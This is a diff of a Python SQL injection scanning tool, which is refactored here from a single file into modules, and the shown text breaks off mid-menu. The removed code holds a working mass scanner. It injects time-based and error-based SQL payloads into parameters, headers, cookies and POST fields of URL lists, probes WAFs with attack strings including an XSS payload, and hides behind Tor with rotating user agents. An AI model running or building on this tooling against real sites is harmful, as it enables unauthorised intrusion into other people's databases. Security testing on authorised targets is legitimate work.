@@ -1,647 +1,356 @@
-import argparse
-import requests
-import time
-import os
-import random
-import urllib3
+#!/usr/bin/env python3
+"""
+SQLi Checker - Professional SQL Injection Audit Tool
+Object-Oriented Implementation
+"""
+
 import sys
-import threading
-import psutil
-import re
-import json
-from threading import Lock
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
+import os
+import argparse
+import time
+import random
+from typing import Dict, Tuple
+from pathlib import Path
+
+# Add modules path for correct imports
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))
+
 from colorama import Fore, Style, init
-
+from modules import SQLiScanner, PayloadManager, ReportGenerator
+from concurrent.futures import ThreadPoolExecutor, as_completed
 init(autoreset=True)
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-OUTPUT_DIR = os.path.join(SCRIPT_DIR, "outputs")
-if not os.path.exists(OUTPUT_DIR):
-    os.makedirs(OUTPUT_DIR)
 
-SQL_ERRORS = [
-    # MySQL
-    "SQL syntax", "mysql_fetch", "ORA-01756", "PostgreSQL query failed",
-    "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
-    "SQLSTATE[42000]", "Warning: mysql_", "error in your SQL syntax",
-    "MariaDB server version", "Syntax error or access violation",
-    "MySQL server error", "mysql_error", "mysql_num_rows",
-    
-    # PostgreSQL
-    "FATAL: database", "ERROR: syntax error", "PostgreSQL error",
-    "Postgres error", "pg_query", "psql error",
-    
-    # MSSQL
-    "Incorrect syntax", "Level 15", "Server Error in", "ODBC SQL",
-    "Microsoft OLE DB", "SQL Server", "Msg 102", "Msg 242",
-    
-    # Oracle
-    "ORA-00933", "ORA-01722", "ORA-06512", "Oracle error",
-    "ORA-", "Oracle SQL",
-    
-    # SQLite
-    "SQL error", "malformed SQL", "SQLite error", "disk I/O error",
-    
-    # Generic SQL
-    "SQL injection", "SQL query error", "database error",
-    "query error", "SELECT error", "WHERE error",
-]
+def print_banner():
+    """Displays the application banner with a special character wall"""
+    wall = "#!@)*&^%" * 8
+    banner = f"""{Fore.CYAN}{Style.BRIGHT}
+{wall}
+#!                                                              %
+#!              {Fore.YELLOW}C H A R L I 3 P R O J E C T S{Fore.CYAN}                   !
+#!                                                              %
+#!      {Fore.WHITE}GitHub:   https://github.com/charli3vintage77{Fore.CYAN}           @
+#)      {Fore.WHITE}Telegram: @charli3vintage77{Fore.CYAN}                             #
+#!                                                              %
+{wall}{Style.RESET_ALL}"""
+    print(banner)
 
-PHP_ERRORS = [ 
-    "Parse error", "Fatal error", "Warning:", "Notice:", 
-    "Deprecated:", "Strict Standards", "User Error",
-    "Call to undefined", "Cannot redeclare", "Undefined variable",
-    "Undefined index", "Undefined offset", "type error",
-    "Invalid argument supplied", "Division by zero",
-    "<?php", "<?", "?>"  # PHP Code
-]
-
-FRAMEWORK_ERRORS = {
-    "Yii": ["Yii Error", "Yii Framework", "CException", "CDbException"],
-    "Laravel": ["Laravel Error", "Illuminate", "Whoops", "Exception"],
-    "Django": ["Django TemplateDoesNotExist", "django.core", "TemplateResponseMixin"],
-    "ASP.NET": ["Server Error in", "System.Web", "ASP.NET", "aspx"],
-    "Ruby on Rails": ["Rails Error", "Ruby on Rails", "ActionController"],
-    "Flask": ["Werkzeug", "Flask Error", "werkzeug.exceptions"],
-    "Symfony": ["Symfony Error", "HtmlErrorRenderer"],
-}
-
-SENSITIVE_INFO = [
-    "admin", "password", "secret", "api_key", "token", "config",
-    "database", "connection", "host", "port", "user", "root",
-]
-
-VULNERABLE_HEADERS = [
-    "X-Forwarded-For", "X-Real-IP", "Client-IP", "Referer",
-    "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr"
-]
-
-VULNERABLE_COOKIES = [
-    "id", "session", "user", "admin", "settings", "track", "lang", "uid", "role"
-]
-
-UA_DICT = {
-    "1": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "2": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "3": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
-}
-
-# Threading locks
-results_lock = Lock()
-output_lock = Lock()
-queries_lock = Lock()
-
-# Global counters
-queries_done_global = 0
-total_queries_global = 0
-
-# Smart-Delay system
-global_delay = 0.0
-delay_lock = Lock()
-
-def get_visible_len(text):
-    """Returns text length without ANSI escape characters"""
-    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-    return len(ansi_escape.sub('', text))
-
-def pad_colored(text, width):
-    """Pads colored text with spaces to a visible width"""
-    v_len = get_visible_len(text)
-    return text + (" " * max(0, width - v_len))
-
-WAF_SIGNATURES = {
-    "Cloudflare": {
-        "headers": ["Server: cloudflare", "CF-RAY"],
-        "status_codes": [403],
-        "body_keywords": ["Cloudflare Ray ID", "DDoS protection by Cloudflare"]
-    },
-    "Sucuri": {
-        "headers": ["Server: Sucuri/Cloudproxy", "X-Sucuri-ID"],
-        "status_codes": [403],
-        "body_keywords": ["Sucuri WebSite Firewall - Access Denied"]
-    },
-    "Incapsula": {
-        "headers": ["X-CDN: Incapsula"],
-        "status_codes": [403],
-        "body_keywords": ["Incapsula incident ID"]
-    },
-    "Akamai": {
-        "headers": ["Server: AkamaiGHost"],
-        "status_codes": [403],
-        "body_keywords": ["You don't have permission to access"]
-    },
-    "ModSecurity": {
-        "headers": ["Server: Mod_Security", "Server: ModSecurity"],
-        "status_codes": [403, 406],
-        "body_keywords": ["Mod_Security", "ModSecurity"]
-    },
-    "Wordfence": {
-        "headers": [],
-        "status_codes": [403],
-        "body_keywords": ["Generated by Wordfence"]
-    },
-    "Generic WAF": {
-        "headers": ["X-WAF", "X-WAF-Event"],
-        "status_codes": [403, 406, 501, 503],
-        "body_keywords": ["Access Denied", "Forbidden", "blocked", "firewall"]
-    }
-}
-
-TECH_PAYLOADS = {
-    "MySQL": ["' OR SLEEP(5)--", "\") OR SLEEP(5)--", "SLEEP(5)#"],
-    "MSSQL": ["; WAITFOR DELAY '0:0:5'--", "') WAITFOR DELAY '0:0:5'--"],
-    "PostgreSQL": ["' OR PG_SLEEP(5)--", "') OR PG_SLEEP(5)--"],
-    "Oracle": ["' OR 1=dbms_pipe.receive_message('RDS', 5)--"],
-    "SQLite": ["RANDOMBLOB(500000000/2)"],
-    "Generic": ["' OR SLEEP(5)--", "\") OR SLEEP(5)--"]
-}
-
-vulnerabilities_data = []
-# Statistics
-stats_vulnerability_types = {}
-stats_effective_payloads = {}
-stats_lock = Lock()
-
-def detect_tech_from_headers(headers):
-    """Detects server technology based on HTTP headers"""
-    server = headers.get('Server', '').lower()
-    powered = headers.get('X-Powered-By', '').lower()
-    combined = f"{server} {powered}"
-    
-    if any(x in combined for x in ["mysql", "mariadb"]): return "MySQL"
-    if any(x in combined for x in ["postgresql", "postgres"]): return "PostgreSQL"
-    if any(x in combined for x in ["microsoft", "iis", "mssql", "sql server"]): return "MSSQL"
-    if "oracle" in combined: return "Oracle"
-    if "sqlite" in combined: return "SQLite"
-    return "Generic"
-
-def filter_payloads_by_tech(payloads, tech):
-    """Filters payload list to remove those that don't match the detected tech"""
-    if tech == "Generic": return payloads
-    
-    exclude_map = {
-        "MySQL": ["WAITFOR DELAY", "PG_SLEEP", "DBMS_PIPE", "DBMS_LOCK", "RANDOMBLOB"],
-        "MSSQL": ["SLEEP(", "PG_SLEEP", "DBMS_PIPE", "DBMS_LOCK", "BENCHMARK("],
-        "PostgreSQL": ["SLEEP(", "WAITFOR DELAY", "DBMS_PIPE", "DBMS_LOCK", "BENCHMARK("],
-        "Oracle": ["SLEEP(", "WAITFOR DELAY", "PG_SLEEP", "BENCHMARK("],
-        "SQLite": ["SLEEP(", "WAITFOR DELAY", "PG_SLEEP", "DBMS_PIPE", "DBMS_LOCK"]
-    }
-    
-    excludes = exclude_map.get(tech, [])
-    filtered = []
-    for p in payloads:
-        if not any(ex in p.upper() for ex in excludes):
-            filtered.append(p)
-    return filtered
-
-def get_domain(url):
-    try:
-        netloc = urlparse(url).netloc
-        return netloc if netloc else url.split('/')[0]
-    except:
-        return "unknown"
-
-def print_header(link_idx, total_links, queries_done, total_queries, domain, local_done=0, local_total=0, payloads_count=0, ua_short="", tech="Generic", waf_status="None"):
-    """Displays an advanced status header"""
-    clear_console()
-    progress_bar = draw_progress_bar(queries_done, total_queries)
-    print(f"\n{progress_bar}")
-    
-    cpu_load = psutil.cpu_percent(interval=None)
-    cpu_color = Fore.RED if cpu_load > 80 else (Fore.YELLOW if cpu_load > 50 else Fore.GREEN)
-    
-    remaining = max(0, total_queries - queries_done)
-    print(f"{Fore.BLUE}[SYSTEM]{Style.RESET_ALL} CPU: {cpu_color}{cpu_load}%{Style.RESET_ALL} | "
-          f"Queries: {Fore.CYAN}{queries_done}/{total_queries}{Style.RESET_ALL} (Remaining: {remaining})")
-    print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} Loaded payloads: {Fore.CYAN}{payloads_count}{Style.RESET_ALL} | Tech: {Fore.MAGENTA}{tech}{Style.RESET_ALL} | WAF: {Fore.MAGENTA}{waf_status}{Style.RESET_ALL}")
-    
-    print(Fore.MAGENTA + "═" * 100)
-    print(Fore.YELLOW + f"[TARGET {link_idx}/{total_links}] {domain}")
-    
-    if local_total > 0:
-        local_percent = int((local_done / local_total) * 100)
-        print(Fore.BLUE + f"[LINK PROGRESS] {local_done}/{local_total} ({local_percent}%)" + Style.RESET_ALL)
-    
-    if ua_short:
-        print(Fore.CYAN + f"[UA] {ua_short}")
-    print(Fore.MAGENTA + "═" * 100 + "\n")
-
-def clear_console():
-    """Clears the system console"""
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def highlight_sql(payload):
-    """Colors SQL syntax in the payload for better readability"""
-    keywords = ["UNION", "SELECT", "OR", "AND", "SLEEP", "DELAY", "WHERE", "HAVING", "ORDER BY", "IF", "CASE", "WHEN", "THEN", "ELSE", "RLIKE"]
-    colored = str(payload)
-    for kw in keywords:
-        pattern = re.compile(re.escape(kw), re.IGNORECASE)
-        colored = pattern.sub(f"{Fore.YELLOW}\\g<0>{Style.RESET_ALL}", colored)
-    colored = colored.replace("--", f"{Fore.BLUE}--{Style.RESET_ALL}").replace("#", f"{Fore.BLUE}#{Style.RESET_ALL}")
-    return colored
-
-def format_payload_line(payload, is_vulnerable, method_info="", t_type="param", t_name=""):
-    """Formats a test result line into a table layout"""
-    type_map = {"param": "PRM", "header": "HDR", "cookie": "CKI", "post": "POST"}
-    type_label = f"{Fore.CYAN}[{type_map.get(t_type, 'PRM'):^4}]{Style.RESET_ALL}"
-    
-    display_payload = highlight_sql((payload[:40] + '...') if len(payload) > 40 else payload)
-    display_target = (t_name[:15] + '..') if len(t_name) > 15 else t_name
-    
-    status = f"{Fore.GREEN}✓ VULNERABLE{Style.RESET_ALL}" if is_vulnerable else (f"{Fore.RED}✗ ERROR     {Style.RESET_ALL}" if method_info == "Timeout/Connection" else f"{Fore.RED}✗ NONE      {Style.RESET_ALL}")
-    method_str = f"{Fore.YELLOW}[{method_info}]{Style.RESET_ALL}" if method_info else ""
-    
-    return f"  {type_label}  {pad_colored(display_payload, 45)} {Fore.WHITE}{display_target.ljust(18)}{Style.RESET_ALL} {status} {method_str}"
-
-def print_payload_result(payload, is_vulnerable, method_info="", t_type="param", t_name=""):
-    print(format_payload_line(payload, is_vulnerable, method_info, t_type, t_name))
-    sys.stdout.flush()
-
-WAF_TRIGGER_PAYLOADS = [
-    "' OR 1=1--",
-    "<script>alert(1)</script>",
-    "UNION SELECT NULL,NULL,NULL--",
-    "SLEEP(5)",
-    "AND 1=1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--"
-]
-
-def detect_waf(session, url, timeout, ua):
-    """Attempts to detect WAF by sending triggering payloads"""
-    headers = {"User-Agent": ua}
-    try:
-        baseline_response = session.get(url, headers=headers, timeout=timeout, verify=False)
-    except requests.exceptions.RequestException:
-        return "Error (Baseline Failed)"
-
-    for payload in WAF_TRIGGER_PAYLOADS:
-        test_url = f"{url}?id={payload}"
-        try:
-            waf_response = session.get(test_url, headers=headers, timeout=timeout, verify=False)
-            for waf_name, signatures in WAF_SIGNATURES.items():
-                for header_sig in signatures.get("headers", []):
-                    if header_sig.lower() in str(waf_response.headers).lower():
-                        return waf_name
-                if waf_response.status_code in signatures.get("status_codes", []):
-                    if waf_response.status_code != baseline_response.status_code:
-                        return waf_name
-                for keyword in signatures.get("body_keywords", []):
-                    if keyword.lower() in waf_response.text.lower():
-                        return waf_name
-        except requests.exceptions.RequestException:
-            continue
-    return "None"
-
-def generate_html_report(filepath, vulnerabilities, stats_types, stats_payloads):
-    """Creates an interactive HTML report with charts"""
-    v_json = json.dumps(vulnerabilities)
-    t_labels = json.dumps(list(stats_types.keys()))
-    t_data = json.dumps(list(stats_types.values()))
-    p_labels = json.dumps([p[:30] for p in stats_payloads.keys()])
-    p_data = json.dumps(list(stats_payloads.values()))
-
-    html = f"""
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>SQLi Audit Report</title>
-        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-        <style>
-            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #eee; margin: 40px; }}
-            .container {{ max-width: 1200px; margin: auto; background: #2d2d2d; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }}
-            h1 {{ color: #00d4ff; text-align: center; }}
-            .charts {{ display: flex; flex-wrap: wrap; justify-content: space-around; margin-bottom: 40px; }}
-            .chart-box {{ width: 45%; min-width: 400px; background: #333; padding: 15px; border-radius: 8px; }}
-            table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
-            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #444; }}
-            th {{ background: #00d4ff; color: #000; }}
-            tr:hover {{ background: #3d3d3d; }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>SQL Injection Audit Report</h1>
-            <div class="charts">
-                <div class="chart-box"><canvas id="typeChart"></canvas></div>
-                <div class="chart-box"><canvas id="payloadChart"></canvas></div>
-            </div>
-            <table>
-                <thead><tr><th>Time</th><th>Domain</th><th>Target</th><th>Method</th><th>Payload</th></tr></thead>
-                <tbody id="vulnTable"></tbody>
-            </table>
-        </div>
-        <script>
-            const vulns = {v_json};
-            const tbody = document.getElementById('vulnTable');
-            vulns.forEach(v => {{
-                const row = `<tr><td>${{v.time}}</td><td>${{v.domain}}</td><td>${{v.target}}</td><td>${{v.method}}</td><td><code>${{v.payload}}</code></td></tr>`;
-                tbody.innerHTML += row;
-            }});
-            new Chart(document.getElementById('typeChart'), {{
-                type: 'pie',
-                data: {{ labels: {t_labels}, datasets: [{{ data: {t_data}, backgroundColor: ['#ff6384','#36a2eb','#ffce56','#4bc0c0','#9966ff'] }}] }},
-                options: {{ plugins: {{ title: {{ display: true, text: 'Vulnerability Types', color: '#fff' }} }} }}
-            }});
-            new Chart(document.getElementById('payloadChart'), {{
-                type: 'bar',
-                data: {{ labels: {p_labels}, datasets: [{{ label: 'Effectiveness', data: {p_data}, backgroundColor: '#00d4ff' }}] }},
-                options: {{ plugins: {{ title: {{ display: true, text: 'Top Effective Payloads', color: '#fff' }} }} }}
-            }});
-        </script>
-    </body>
-    </html>
-    """
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(html)
-
-def print_statistics_summary():
-    """Displays the final summary of statistics"""
-    if not stats_vulnerability_types:
-        print(Fore.YELLOW + "\n[!] No vulnerabilities detected - no statistics to display." + Style.RESET_ALL)
-        return
-
-    print(Fore.CYAN + Style.BRIGHT + "\n" + "═"*60)
-    print(Fore.CYAN + Style.BRIGHT + "║" + " "*18 + "STATISTICS SUMMARY" + " "*18 + "║")
-    print(Fore.CYAN + Style.BRIGHT + "═"*60)
-
-    print(Fore.YELLOW + "\n[+] Most common vulnerability types:")
-    sorted_types = sorted(stats_vulnerability_types.items(), key=lambda x: x[1], reverse=True)
-    for v_type, count in sorted_types[:5]:
-        print(f"    - {v_type:30} : {Fore.GREEN}{count}{Style.RESET_ALL} hits")
-
-    print(Fore.YELLOW + "\n[+] Most effective payloads:")
-    sorted_payloads = sorted(stats_effective_payloads.items(), key=lambda x: x[1], reverse=True)
-    for payload, count in sorted_payloads[:5]:
-        clean_p = payload.replace('\n', ' ').strip()
-        highlighted = highlight_sql(clean_p[:40])
-        print(f"    - {highlighted:50} : {Fore.GREEN}{count}{Style.RESET_ALL} successes")
-    print(Fore.CYAN + "\n" + "═"*60 + Style.RESET_ALL)
-
-def log_vulnerability(domain, url, payload, response_text, method="Error-Based", target="URL Param"):
-    filename = f"VULN_{domain.replace('.', '_')}.txt"
-    filepath = os.path.join(OUTPUT_DIR, filename)
-    with results_lock:
-        vulnerabilities_data.append({
-            "domain": domain, "url": url, "payload": payload,
-            "method": method, "target": target, "time": time.strftime('%H:%M:%S')
-        })
-        with open(filepath, "a", encoding="utf-8") as f:
-            f.write(f"\n[{time.strftime('%H:%M:%S')}] --- VULNERABILITY DETECTED ---\n")
-            f.write(f"URL: {url}\nPayload: {payload}\nTarget: {target}\nMethod: {method}\n" + "-"*30 + "\n")
-            f.write(response_text[:1000] + "\n" + "="*50 + "\n")
-
-def crawl_links(session, url, timeout, ua):
-    """Crawls for href links and hidden form fields"""
-    headers = {"User-Agent": ua}
-    all_links = set()
-    parameterized = set()
-    try:
-        response = session.get(url, headers=headers, timeout=timeout, verify=False)
-        if response.status_code != 200:
-            return all_links, parameterized
-        
-        html = response.text
-        base_domain = urlparse(url).netloc
-        links = re.findall(r'href=["\'](.[^"\' >]+)["\']', html)
-        for link in links:
-            full_url = urljoin(url, link).split('#')[0]
-            if urlparse(full_url).netloc == base_domain:
-                all_links.add(full_url)
-                if '?' in full_url and '=' in full_url:
-                    parameterized.add(full_url)
-
-        forms = re.finditer(r'<form\b[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
-        for form_match in forms:
-            content = form_match.group(1)
-            opening_tag = html[max(0, form_match.start()):form_match.start() + html[form_match.start():].find('>')]
-            action_match = re.search(r'action=["\']([^"\']*)["\']', opening_tag, re.IGNORECASE)
-            action = action_match.group(1) if action_match else ""
-            hidden_inputs = re.findall(r'<input\b[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', content, re.IGNORECASE)
-            if hidden_inputs:
-                params = {name: val for name, val in hidden_inputs}
-                target_url = urljoin(url, action)
-                sep = '&' if '?' in target_url else '?'
-                surface_url = f"{target_url}{sep}{urlencode(params)}"
-                if urlparse(surface_url).netloc == base_domain:
-                    parameterized.add(surface_url)
-        return all_links, parameterized
-    except Exception:
-        return all_links, parameterized
-
-def inject_params(url, payload):
-    parsed = urlparse(url)
-    params = parse_qs(parsed.query)
-    if not params:
-        return [ (f"{url}?id={payload}", "id_added") ]
-    injected_urls = []
-    for key in params:
-        new_params = params.copy()
-        new_params[key] = [f"{val}{payload}" for val in params[key]]
-        new_query = urlencode(new_params, doseq=True)
-        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
-        injected_urls.append((new_url, key))
-    return injected_urls
-
-def test_tor_connection():
-    """Tests Tor SOCKS5 connection"""
-    try:
-        session = requests.Session()
-        session.proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
-        session.verify = False
-        response = session.get('http://check.torproject.org/api/ip', timeout=5)
-        if response.json().get('is_tor'):
-            print(Fore.GREEN + f"[✓] Tor Connection: OK (IP: {response.json().get('ip')})")
-            return True
-        return False
-    except Exception:
-        return False
-
-def get_session_with_config(use_tor, random_ua, ua_rotation_interval):
-    session = requests.Session()
-    session.verify = False
-    if use_tor:
-        session.proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
-    return session
-
-def rotate_user_agent(current_ua, random_ua, request_count, ua_rotation_interval):
-    if random_ua and request_count % ua_rotation_interval == 0:
-        return random.choice(list(UA_DICT.values()))
-    return current_ua
-
-def select_payload_file():
-    payloads_dir = os.path.join(SCRIPT_DIR, "payloads")
-    if not os.path.exists(payloads_dir): return None
-    payload_files = sorted([f for f in os.listdir(payloads_dir) if f.endswith('.txt')])
-    if not payload_files: return None
-    
-    print(Fore.CYAN + "\n=== AVAILABLE PAYLOADS ===")
-    for idx, filename in enumerate(payload_files, 1):
-        print(f"{Fore.YELLOW}[{idx}]{Style.RESET_ALL} {filename}")
-    
-    try:
-        choice = int(input(Fore.GREEN + "\nSelect number: " + Style.RESET_ALL)) - 1
-        if 0 <= choice < len(payload_files):
-            return os.path.join(payloads_dir, payload_files[choice])
-    except ValueError: pass
-    return None
-
-def draw_progress_bar(current, total, width=60):
-    percent = current / total if total > 0 else 0
-    filled = int(width * percent)
-    bar = '█' * filled + '░' * (width - filled)
-    return f"{Fore.CYAN}[{bar}] {int(percent * 100)}% ({current}/{total}){Style.RESET_ALL}"
-
-def adjust_threads_by_cpu(target_threads):
-    cpu_usage = psutil.cpu_percent(interval=None)
-    if cpu_usage > 90: return 1
-    return target_threads
-
-def check_sqli(session, url, timeout, mode, ua, custom_payloads, domain_display, link_idx, total_links, payloads_count, delay=0, threads=1, scan_headers=False, scan_cookies=False, scan_post=False, detected_tech="Generic"):
-    global queries_done_global
-    payloads = []
-    if mode == 1: payloads = ["'", "\"", "';--"]
-    elif mode == 2: payloads = TECH_PAYLOADS.get(detected_tech, TECH_PAYLOADS["Generic"])
-    elif mode == 3: payloads = ["'", "\"", "';--"] + TECH_PAYLOADS.get(detected_tech, TECH_PAYLOADS["Generic"])
-    elif mode == 4: payloads = custom_payloads
-
-    allowed_payloads = filter_payloads_by_tech(payloads, detected_tech)
-    headers = {"User-Agent": ua if ua else UA_DICT["1"]}
-    results = {"success": 0, "failed": 0}
-    local_lock = Lock()
-    positive_hits = []
-    
-    baseline_status, baseline_len, baseline_response = 200, 0, ""
-    captured_cookies = {}
-    try:
-        res = session.get(url, headers=headers, timeout=timeout + 5, verify=False)
-        baseline_response = res.text.lower()
-        baseline_status = res.status_code
-        baseline_len = len(baseline_response)
-        captured_cookies = session.cookies.get_dict()
-    except: pass
-
-    test_cases_list = []
-    for p in payloads:
-        is_allowed = (p in allowed_payloads)
-        if not is_allowed: continue
-        for test_url, param_name in inject_params(url, p):
-            test_cases_list.append(('param', test_url, param_name, p))
-        if scan_headers:
-            for h in VULNERABLE_HEADERS: test_cases_list.append(('header', url, h, p))
-        if scan_cookies:
-            for c in captured_cookies or VULNERABLE_COOKIES[:3]: test_cases_list.append(('cookie', url, c, p))
-        if scan_post:
-            test_cases_list.append(('post', url, 'id', p))
-
-    def test_single_case(case):
-        global global_delay, queries_done_global
-        t_type, test_url, t_name, payload = case
-        with queries_lock: queries_done_global += 1
-        with delay_lock: current_sleep = global_delay
-        if current_sleep > 0: time.sleep(current_sleep)
-
-        current_headers, current_cookies = headers.copy(), captured_cookies.copy()
-        if t_type == 'header': current_headers[t_name] = payload
-        elif t_type == 'cookie': current_cookies[t_name] = payload
-
-        try:
-            start_time = time.time()
-            if t_type == 'post':
-                response = session.post(test_url, data={t_name: payload}, headers=current_headers, cookies=current_cookies, timeout=timeout + 5, verify=False)
-            else:
-                response = session.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout + 5, verify=False)
-            
-            duration = time.time() - start_time
-            content, status_code = response.text.lower(), response.status_code
-
-            if status_code == 429:
-                with delay_lock: global_delay += 2.0
-                return
-
-            is_vulnerable, method_info = False, ""
-            if status_code >= 500: is_vulnerable, method_info = True, f"Server Error ({status_code})"
-            elif any(err in content and err not in baseline_response for err in SQL_ERRORS): is_vulnerable, method_info = True, "SQL Error"
-            elif duration >= 5 and "SLEEP" in payload.upper(): is_vulnerable, method_info = True, "Time-Based"
-
-            if is_vulnerable:
-                log_vulnerability(get_domain(url), test_url, payload, response.text[:1000], method_info, f"{t_type.upper()}: {t_name}")
-                with stats_lock:
-                    stats_vulnerability_types[method_info] = stats_vulnerability_types.get(method_info, 0) + 1
-                    stats_effective_payloads[payload] = stats_effective_payloads.get(payload, 0) + 1
-                with local_lock: positive_hits.append(format_payload_line(payload, True, method_info, t_type, t_name))
-            
-            with output_lock: print_payload_result(payload, is_vulnerable, method_info if is_vulnerable else "", t_type, t_name)
-        except: pass
-
-    with ThreadPoolExecutor(max_workers=adjust_threads_by_cpu(threads)) as executor:
-        executor.map(test_single_case, test_cases_list)
-    return len(positive_hits) > 0, results
-
-def main():
-    parser = argparse.ArgumentParser(description="SQL Injection Audit Tool")
-    parser.add_argument("-i", "--input", help="File with URL list")
-    parser.add_argument("-u", "--url", help="Single URL to scan")
-    parser.add_argument("-o", "--output", required=True, help="Output file")
-    parser.add_argument("--random-agent", action="store_true", help="Use random UA")
-    parser.add_argument("--tor", action="store_true", help="Use Tor")
-    parser.add_argument("--threads", type=int, default=1)
-    parser.add_argument("--crawl", action="store_true")
-    parser.add_argument("--depth", type=int, default=1)
-    args = parser.parse_args()
-
+def validate_args(args):
+    """Arguments validation"""
     if not args.input and not args.url:
-        print(Fore.RED + "[-] Missing input (-i) or url (-u)!")
-        sys.exit(1)
-
-    print(Fore.CYAN + Style.BRIGHT + "SQL INJECTION AUDIT TOOL INITIALIZED\n")
-    scan_headers = input("Scan Headers? (y/n): ").lower() == 'y'
-    scan_cookies = input("Scan Cookies? (y/n): ").lower() == 'y'
-    scan_post = input("Scan POST method? (y/n): ").lower() == 'y'
-    gen_html = input("Generate HTML report? (y/n): ").lower() == 'y'
+        print(Fore.RED + "[-] You must provide an input file (-i) or a single URL (-u)!" + Style.RESET_ALL)
+        return False
     
-    sqli_mode = int(input("\nMode [1]Basic [2]Advanced [3]All [4]Custom: "))
+    if args.threads < 1 or args.threads > 50:
+        print(Fore.RED + "[-] Thread count must be between 1 and 50" + Style.RESET_ALL)
+        return False
+    
+    return True
+
+
+# This function is no longer called if args.crawl is True
+def get_user_input_menu():
+    """Interactive menu - scanning options"""
+    print(Fore.YELLOW + "\n=== SCANNING OPTIONS ===" + Style.RESET_ALL)
+    
+    # Timeout
+    t_in = input(Fore.YELLOW + "1. Timeout (seconds, default 5): " + Style.RESET_ALL)
+    timeout = int(t_in) if t_in else 5
+    
+    # Delay between payloads
+    d_in = input(Fore.YELLOW + "2. Delay between payloads (seconds, default 0): " + Style.RESET_ALL)
+    payload_delay = float(d_in) if d_in else 0
+    
+    # User-Agent
+    print(Fore.YELLOW + "\n3. User-Agent:" + Style.RESET_ALL)
+    print("   [1] Chrome  [2] iPhone  [3] Firefox  [L] Random")
+    ua_choice = input(Fore.YELLOW + "Choice: " + Style.RESET_ALL).upper()
+    random_ua_mode = ua_choice == 'L'
+    
+    # UA rotation interval
+    ua_rotation_interval = 5
+    if random_ua_mode:
+        rot_in = input(Fore.YELLOW + "4. Change User-Agent every X requests? (default 5): " + Style.RESET_ALL)
+        ua_rotation_interval = int(rot_in) if rot_in else 5
+    
+    # Injection options
+    print(Fore.RED + Style.BRIGHT + "\n[BETA] INJECTION OPTIONS (Can drastically increase scan time!):" + Style.RESET_ALL)
+    scan_headers = input(Fore.YELLOW + "5. Scan HTTP Headers? (yes/no): " + Style.RESET_ALL).lower() == 'yes'
+    scan_cookies = input(Fore.YELLOW + "6. Scan Cookies? (yes/no): " + Style.RESET_ALL).lower() == 'yes'
+    scan_post = input(Fore.YELLOW + "7. Scan POST method? (yes/no): " + Style.RESET_ALL).lower() == 'yes'
+    
+    # HTML Report
+    gen_html = input(Fore.YELLOW + "\n8. Generate interactive HTML report? (yes/no): " + Style.RESET_ALL).lower() == 'yes'
+    
+    # SQLi mode
+    print(Fore.YELLOW + "\n9. Payload mode:" + Style.RESET_ALL)
+    print("   [1] Basic  [2] Advanced  [3] All  [4] CUSTOM")
+    sqli_mode = int(input(Fore.YELLOW + "Choice (default 3): " + Style.RESET_ALL) or "3")
+    
     custom_payloads = []
     if sqli_mode == 4:
-        p_path = select_payload_file()
-        if p_path:
-            with open(p_path, 'r', errors='ignore') as f: custom_payloads = [l.strip() for l in f if l.strip()]
-
-    use_tor = False
-    if args.tor: use_tor = test_tor_connection()
-
-    links = [args.url] if args.url else []
-    if args.input:
-        with open(args.input, 'r', errors='ignore') as f: links.extend([l.strip() for l in f if l.strip()])
-
-    final_output_path = os.path.join(OUTPUT_DIR, args.output)
-    total_links = len(links)
+        payload_manager = PayloadManager(payloads_dir='payloads')
+        payload_files = payload_manager.get_payload_file_list()
+        
+        if not payload_files:
+            print(Fore.RED + "[-] No custom payload files found in 'payloads/' directory!")
+            sqli_mode = 3
+        else:
+            print(Fore.CYAN + "\n=== AVAILABLE CUSTOM PAYLOADS ===" + Style.RESET_ALL)
+            for idx, (filename, _) in enumerate(payload_files, 1):
+                print(f"{Fore.YELLOW}[{idx}]{Style.RESET_ALL} {filename}")
+            
+            try:
+                choice = int(input(Fore.GREEN + "\nSelect payload number: " + Style.RESET_ALL)) - 1
+                if 0 <= choice < len(payload_files):
